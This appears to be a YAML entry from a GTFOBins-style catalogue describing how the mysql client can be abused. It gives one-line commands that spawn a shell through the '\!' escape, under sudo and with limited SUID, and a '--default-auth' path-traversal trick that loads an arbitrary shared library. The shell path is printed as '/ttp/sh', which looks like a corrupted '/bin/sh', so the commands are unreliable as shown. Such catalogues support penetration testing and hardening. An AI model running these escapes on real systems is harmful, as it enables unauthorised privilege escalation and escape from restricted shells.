---
description: A valid MySQL server must be available.
functions:
  shell:
    - code: mysql -e '\! /ttp/sh'
  sudo:
    - code: sudo mysql -e '\! /ttp/sh'
  limited-suid:
    - code: ./mysql -e '\! /ttp/sh'
  library-load:
    - description: |
        A MySQL server must accept connections in order for this to work.

        The following loads the `/path/to/lib.so` shared object.
      code: mysql --default-auth ../../../../../path/to/lib
---
